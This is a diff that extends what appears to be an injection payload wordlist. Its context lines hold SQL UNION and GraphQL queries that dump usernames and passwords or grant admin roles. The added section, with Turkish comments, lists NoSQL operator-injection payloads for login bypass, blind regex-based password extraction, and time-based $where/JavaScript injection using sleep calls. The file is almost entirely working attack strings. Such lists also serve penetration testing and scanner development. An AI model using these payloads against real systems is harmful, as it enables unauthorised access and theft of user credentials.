@@ -267,3 +267,29 @@ test' UNION SELECT id, username, password FROM User--
 {"query": "{ users(limit: 100, offset: 0) { id username email password role } }"}
 {"query": "{ users(orderBy: {password: asc}) { id username password } }"}
 {"query": "mutation { updateUser(where: {}, _set: {role: \"admin\"}) { affected_rows } }"}
+
+# ── [v2026-06] MODERN / ADVANCED ADDITIONS ──
+# query-string operatör injection (auth bypass)
+username[$ne]=1&password[$ne]=1
+username[$gt]=&password[$gt]=
+username[$regex]=^admin&password[$ne]=1
+# JSON body auth bypass
+{"username":{"$ne":null},"password":{"$ne":null}}
+{"username":{"$gt":""},"password":{"$gt":""}}
+{"username":"admin","password":{"$ne":"x"}}
+{"username":{"$in":["admin","administrator","root"]},"password":{"$ne":""}}
+# blind veri çıkarımı ($regex karakter karakter)
+{"password":{"$regex":"^a"}}
+{"password":{"$regex":"^.{8}$"}}
+{"username":{"$regex":"admin","$options":"i"}}
+# $where / JS injection zaman tabanlı
+{"$where":"sleep(5000)"}
+{"username":{"$where":"sleep(5000)"}}
+';return(true);var x='
+';return('a'=='a'&&'1'=='1');//
+';sleep(5000);//
+0;return true
+# operatör keşfi
+{"_id":{"$ne":null}}
+{"$or":[{},{"x":"y"}]}
+[$func]=function(){return true}
